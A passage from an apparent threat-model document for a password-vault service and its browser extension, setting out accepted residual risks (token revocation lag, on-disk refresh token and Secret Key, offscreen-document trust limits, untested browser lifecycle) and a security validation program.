  revoked extension session keeps working at the vault service for up to that
  window. MEASURED in PR1's live drive rather than reasoned about: immediately
  after the revoke, identity answered 401 and the vault answered 200; 33 seconds
  later the vault answered 401.

  The cache itself is a deliberate trade and is not the problem — negatives are
  never cached, precisely so a transient identity outage cannot lock out valid
  tokens. What M16 changes is the COST of that window. Before, it meant a
  revoked browser session lingered briefly. Now the product ships a control whose
  stated purpose is "I think my extension is compromised, kill it", and the
  credential outlives the screen that says it is gone.

  Bounded rather than alarming: what survives the window is a session that
  reaches five vault routes, every one of which yields ciphertext — the item
  reads sit behind `VaultSessionGuard`, which needs a completed SRP unlock, and
  that needs the vault password and the device Secret Key. It cannot reset a
  vault, replace a keyset, delete an item, touch emergency access, or mint
  another credential. The 30 seconds buy an attacker who already holds the token
  nothing they did not have a moment earlier.

  What is OWED is that the surface not promise more than the platform delivers.
  A revoke control that reads as instantaneous while a downstream service still
  admits the token is the M9 shape inverted — not a control reading as an
  outage, but an outage-free UI reading as a stronger control than it is.
  Shortening the TTL is the wrong fix (it trades a stated availability property
  for a cosmetic one); saying so on the screen, or having the surface report
  revocation as taking effect rather than as complete, is the right one. Left
  open deliberately, and named here so whoever writes that copy knows why.

**Added by PR2a (the extension and its transport).**

- *The refresh token is on disk.* `chrome.storage.local` is not memory-backed, so
  a paired device keeps a refresh-capable credential for up to its 30-day life
  where local malware or another process running as the user can read it.
  `chrome.storage.session` was rejected for it: pairing is deliberately once per
  browser and repeating it needs a step-up on the APP origin, so a device that
  forgot its pairing on every browser restart would push people through that
  ceremony daily and, predictably, into not using the extension. WHAT BOUNDS IT
  IS THE AUDIENCE, not the storage — the credential reaches five vault routes and
  three identity ones and nothing else, cannot reset a vault, replace a keyset,
  delete an item, touch emergency access, mint another handoff or enumerate the
  owner's other devices, and still decrypts nothing, because every item read sits
  behind a vault session that only a completed SRP unlock produces. It is also
  visible in the owner's paired-devices list and revocable from there in one
  click. No key material is ever written there, in PR2b or later.
- *One more unauthenticated identity route is reachable through the vault
  origin.* The edge proxies `POST /v1/auth/refresh` (and pairing redemption) as
  credential-free pass-throughs, so that the extension needs one
  `host_permission` and one origin rather than addressing identity directly. Both
  are exact-match paths carrying no bearer, neither can be READ cross-site
  because this edge sets no CORS headers and answers no preflight, and identity's
  own uniform refusals are unchanged. `POST /v1/auth/logout/refresh` remains
  deliberately unreachable.
- *The revocation window above, confirmed from the other end.* PR2a's live drive
  measured it from the extension's side rather than the owner's: after logout,
  identity refused the token at t+0 while the vault — reached through the edge on
  the same token — answered 200 at t+0 and t+10 and 401 from t+20. Same 30-second
  positive cache, same conclusion, two independent measurements.

**Added by PR2b (unlock and read).**

- *The Secret Key is remembered on disk, so two of three factors sit on one
  disk.* 2SKD derives every vault key from the vault password AND a 128-bit
  device Secret Key; the extension keeps the latter in its IndexedDB by default,
  with an explicit opt-out and copy saying what that costs. The alternative —
  retyping 26 characters at every unlock, against a 15-minute vault session that
  cannot be renewed — reliably pushes people to a text file, which is worse. But
  this artifact ALREADY holds a 30-day refresh token on disk, so local malware
  or another process running as the user now finds both, missing only the
  password; and unlike the vault ORIGIN, whose defence is an empty dependency
  tree, `script-src 'self'` and enforced Trusted Types, this is a signed artifact
  auto-updated through a vendor store with no CSP in its path (§4 TB9). WHAT IT
  STILL DOES NOT BUY IS AN OFFLINE UNLOCK: the wrapped master key, the SRP salt
  and the KDF parameters arrive from the server per unlock and are never stored,
  so opening a vault needs the password and a live handshake on a live extension
  session — which appears in the owner's paired-devices list and is revocable
  from there in one click. The Secret Key is forgotten when the device is
  disconnected.
- *The offscreen document is not a boundary against the rest of the extension,
  and must not be read as one.* `chrome.runtime.sendMessage` delivers to every
  extension context with a listener, so the vault password and Secret Key transit
  a broadcast the service worker also receives and ignores by `target`. That is
  a routing filter. All extension contexts are one signed artifact and one trust
  domain: the offscreen document buys LIFETIME (an MV3 service worker is
  terminated in seconds) and NON-EXTRACTABLE key storage, not secrecy from the
  popup. Anyone who can read that channel has already compromised the artifact
  and could ask the worker to decrypt instead. What the split does buy is
  auditability — the key holder cannot reach the network and the host cannot
  decrypt, so "can anything derived from the password leave the device" is a
  one-file question.
- *NOTHING HERE HAS RUN IN A BROWSER.* CI cannot load a packed extension, so the
  crypto is exercised against Node's WebCrypto and the platform against a
  `chrome` API double in jsdom, with the transport proven live at the vault edge
  in PR2a. Unexercised: the offscreen document's lifecycle,
  `chrome.offscreen.createDocument` from a service worker, the worker boundary,
  and IndexedDB under a real extension origin. This is the same status the
  repository gives the Plaid live client and the Anthropic adapter — the first
  real load is a deployment event, not a test result — and it is stated here
  rather than left to be inferred from a green suite.
- *The IndexedDB premise is now MEASURED, and the brief was wrong about it.* The
  roadmap REJECTS persisting a non-extractable `CryptoKey` in extension
  IndexedDB on CEREMONY grounds — it would yield a vault permanently open with
  no password, Secret Key or TOTP, defeating 2SKD and docs/01 §5 — and
  explicitly NOT on the brief's serializability grounds, which CLAUDE.md
  recorded as a claim to measure. PR1 did not measure it; PR2b has, in a real
  Chromium: a non-extractable `CryptoKey` structured-clones successfully and the
  clone is still `extractable: false`; IndexedDB accepts it; and after a page
  navigation it comes back as a `CryptoKey`, still non-extractable, with
  `exportKey` still refusing and an AES-GCM round trip still working. So the
  brief's premise is FALSE in the direction that matters, exactly as docs/04's
  correction claimed — now demonstrated rather than asserted. THE REJECTION IS
  UNAFFECTED: it never rested on that premise, and a key that persists this well
  is precisely what makes the ceremony argument bite.
  *Still unmeasured, and handed over rather than claimed:* survival across a full
  BROWSER RESTART, and the same sequence under a real `chrome-extension://`
  origin. A scratch unpacked probe exists for both; it is deliberately not
  committed, because a key-persistence harness inside an artifact that must not
  persist keys is the wrong thing to be right about.

## 7. Validation program

- **Continuous:** SAST/DAST/dependency scanning in CI; fuzzing on parsers (document ingest, OCR, webhook handlers); secrets scanning; IaC policy checks (tfsec/OPA).
- **Quarterly:** External penetration test rotating focus (auth → vault → settlement → APIs); purple-team exercise against one §5 scenario.
- **Annually:** Full red team including social engineering of the settlement flow; SOC 2 Type II audit; DR failover game day; threat-model refresh.
- **Always-on:** Public bug bounty with elevated payouts for Zone A and settlement-flow findings.
